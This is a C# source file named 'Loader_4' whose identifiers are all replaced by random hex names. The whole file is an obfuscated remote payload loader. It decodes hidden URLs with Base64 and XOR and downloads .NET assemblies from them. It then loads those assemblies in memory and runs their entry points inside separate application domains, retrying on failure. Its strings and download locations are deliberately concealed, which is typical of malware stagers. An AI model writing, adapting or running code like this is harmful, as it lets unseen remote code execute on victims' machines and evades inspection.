using System;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Loader_4
{
    public class _de80ac7229a647848bdc895fcd245bf4
    {
        public class _f1d89ac411dc402996346c639d49f624 : MarshalByRefObject
        {
            public void _fe6b30b9c3d6400c80f69337158d4b99(string url, int retry, int timeout)
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                WebClient _d5745bc0d7364e7993468551c54fdceb = new WebClient();
                byte[] _5e8f8fb42b23411bb79bf69c204b611e = null;

                while (retry > 0 && _5e8f8fb42b23411bb79bf69c204b611e == null)
                {
                    try
                    {
                        _5e8f8fb42b23411bb79bf69c204b611e = _d5745bc0d7364e7993468551c54fdceb.DownloadData(url);
                    }
                    catch (WebException ex)
                    {
                        Console.WriteLine(
                            System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("dBAQV18DX0ENUwpMW0laFEUSTwdDVQtMUVUHRVcUVg9GTA5SFTYxfhxBYFRIVRVQWUoUVV5ADRlTREReUFMMC1UVGQMIXEZFUBcRS1sPVBhLXxcZTBxJE0VbQAdLSk0D"), "5cc22a38-0e97-4312-bc9d-50ce1f9bf8f7")),
                            timeout, retry);
                        retry--;
                        Thread.Sleep(timeout * 1000);
                    }
                }

                if (_5e8f8fb42b23411bb79bf69c204b611e == null)
                {
                    Console.WriteLine(System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("JUMRBlRQDR8NXVpFQUtbFgwCAxhzTF1ZDVZQRkdaA0YVEwoAAUMRTRcc"), "d0bc92af-351a-4cbf-8644-d87f32ffeaec")));
                    Environment.Exit(-1);
                }

                var _047831bf34c7416e90d401df04fa6772 = Assembly.Load(_5e8f8fb42b23411bb79bf69c204b611e);
                Object[] _af38dba3fe9242ffb164e4a76b99c97c = new String[] { null };
                _047831bf34c7416e90d401df04fa6772.EntryPoint.Invoke(null, _af38dba3fe9242ffb164e4a76b99c97c);
            }
        }


       public static byte[] _c35b26f35db2462bae2c89acdb5d0830(byte[] input, string theKeystring)
       {
            byte[] _ef037f4fccaf462ba5bbb3e37dda1a2c = System.Text.Encoding.UTF8.GetBytes(theKeystring);
            byte[] _81391c75e65f4c5d8bb4083dad35e331 = new byte[input.Length];
            for (int _60b93d85eede422f906564a927ce28f5 = 0; _60b93d85eede422f906564a927ce28f5 < input.Length; _60b93d85eede422f906564a927ce28f5++)
            {
                _81391c75e65f4c5d8bb4083dad35e331[_60b93d85eede422f906564a927ce28f5] = (byte)(input[_60b93d85eede422f906564a927ce28f5] ^ _ef037f4fccaf462ba5bbb3e37dda1a2c[_60b93d85eede422f906564a927ce28f5 % _ef037f4fccaf462ba5bbb3e37dda1a2c.Length]);
            }
            return _81391c75e65f4c5d8bb4083dad35e331;
        }



        static void Main(string[] args)
        {
            AppDomain _21e1797f5bd8400685ac1658a520858f = AppDomain.CreateDomain(System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("A1wQFhU="), "e5bea475-6578-43eb-9f58-e90bf037b1d0")));
            Console.WriteLine(System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("JAtHQRBEd0VdBgsIWERaRAZGSFlDXV0D"), "bb52dd65-bde9-4de4-8789-b2ac15796f86")));
            /*Console.ReadKey();*/
            _f1d89ac411dc402996346c639d49f624 _ab370bcd19934b36b07488d0957427c2 = (_f1d89ac411dc402996346c639d49f624)_21e1797f5bd8400685ac1658a520858f.CreateInstanceAndUnwrap(typeof(_f1d89ac411dc402996346c639d49f624).Assembly.FullName, new _f1d89ac411dc402996346c639d49f624().GetType().FullName);
            _ab370bcd19934b36b07488d0957427c2._fe6b30b9c3d6400c80f69337158d4b99(System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("CU1MRAgXTlcUVBYGBhUaUBcAHw0bKF9MXC4DTFJMUw=="), "a98428af-f870-4a91-84d0-8cfb7460a631")), 3, 5);
            /*Console.ReadKey();*/
            Console.WriteLine(System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("YltVXFAGXQ1KEHVYQF5AEyVCXQVXVQNEWA=="), "75931b4c-0312-43d2-a88b-699643edcaba")));
            AppDomain.Unload(_21e1797f5bd8400685ac1658a520858f);
            /*Console.ReadKey();*/
            AppDomain _78ea0027601a420187615e68ca061795 = AppDomain.CreateDomain(System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("RgAGX1lQ"), "5ee074c4-4030-4ec1-9976-6ffc1e5595ee")));
            Console.WriteLine(System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("S1UCVgpcGXhdFlJYX0xdWBkBXwcEQQBJHQ=="), "80a9d899-f672-469b-be5e-375ba3353a99")));
            /*Console.ReadKey();*/
            _f1d89ac411dc402996346c639d49f624 _165afb2e42dc486ea4c94ab765794977 = (_f1d89ac411dc402996346c639d49f624)_78ea0027601a420187615e68ca061795.CreateInstanceAndUnwrap(typeof(_f1d89ac411dc402996346c639d49f624).Assembly.FullName, new _f1d89ac411dc402996346c639d49f624().GetType().FullName);
            _165afb2e42dc486ea4c94ab765794977._fe6b30b9c3d6400c80f69337158d4b99(System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("WhZFFgsYGFUUARcFAhUaUxtXHw1LVRJOC0tfWFccVxlc"), "2b1f177d-3944-4b5f-8d8a-d931522a9365")), 3, 5);
            _165afb2e42dc486ea4c94ab765794977._fe6b30b9c3d6400c80f69337158d4b99(System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("DhUWQ0MOGxhKUEYOQU8aBVxaAn9VUwxKRlBSHDdbU0BIegpZCgQBR1lbWhhfWEVJWUxHElZFAndcRiRfUVRcRAtBWW0MF1BqJw8bHGJBVlJYShwDTEg="), "fab30447-92f4-4f37-992b-0993d32289e5")), 3, 5);
            /*Console.ReadKey();*/
            Console.WriteLine(System.Text.Encoding.UTF8.GetString(_de80ac7229a647848bdc895fcd245bf4._c35b26f35db2462bae2c89acdb5d0830(System.Convert.FromBase64String("YF5cDVRdCAtKFWRRUkJaAEF0XRIBXVpMXwg="), "500b59ae-5741-4da5-be27-6fecf0b4bbf8")));
            AppDomain.Unload(_78ea0027601a420187615e68ca061795);
            /*Console.ReadKey();*/
        }
    }
}
